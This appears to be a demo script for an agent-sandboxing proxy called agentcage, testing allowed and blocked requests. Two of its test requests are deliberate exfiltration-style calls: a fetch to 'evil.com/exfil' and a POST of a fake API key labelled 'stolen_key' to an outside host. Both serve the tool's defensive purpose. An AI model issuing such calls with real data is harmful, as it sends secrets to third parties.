// Minimal agent that demonstrates agentcage proxy behavior.
// No real API key needed — uses httpbin.org to show allowed/blocked requests
// and secret leak detection.

const FAKE_SECRET = "sk-ant-FAKE01-abcdefghijklmnopqrstuvwxyz";

async function main() {
  console.log("agentcage basic example agent");
  console.log(`HTTP_PROXY=${process.env.HTTP_PROXY}`);
  console.log(`HTTPS_PROXY=${process.env.HTTPS_PROXY}`);
  console.log();

  // 1. Allowed request — httpbin.org is in the allowlist
  console.log("[1] GET httpbin.org/get (allowed domain)...");
  try {
    const res = await fetch("http://httpbin.org/get");
    console.log(`  HTTP ${res.status}`);
    const body = JSON.parse(await res.text());
    console.log(`  Origin: ${body.origin}`);
  } catch (err) {
    console.log(`  ERROR: ${err.message}`);
  }

  // 2. Blocked request — evil.com is not in the allowlist
  console.log("\n[2] GET evil.com (blocked domain)...");
  try {
    const res = await fetch("http://evil.com/exfil");
    const body = await res.text();
    console.log(`  HTTP ${res.status}: ${body.slice(0, 100)}`);
  } catch (err) {
    console.log(`  BLOCKED: ${err.message}`);
  }

  // 3. Secret leak detection — posting a fake API key to an allowed domain
  console.log("\n[3] POST secret to httpbin.org (leak detection)...");
  try {
    const res = await fetch("http://httpbin.org/post", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ stolen_key: FAKE_SECRET }),
    });
    const body = await res.text();
    console.log(`  HTTP ${res.status}: ${body.slice(0, 100)}`);
  } catch (err) {
    console.log(`  BLOCKED: ${err.message}`);
  }

  // 4. Clean POST to allowed domain — should succeed
  console.log("\n[4] POST clean data to httpbin.org (allowed)...");
  try {
    const res = await fetch("http://httpbin.org/post", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ message: "hello from the cage", count: 42 }),
    });
    console.log(`  HTTP ${res.status}`);
  } catch (err) {
    console.log(`  ERROR: ${err.message}`);
  }

  console.log("\nAll tests complete. Agent staying alive (Ctrl+C or cage destroy to stop).\n");
}

async function loop() {
  await main();
  // Re-run every 60s so the cage stays up for verify/inspect
  setInterval(async () => {
    console.log("--- re-running tests ---\n");
    await main();
  }, 60_000);
}

loop();
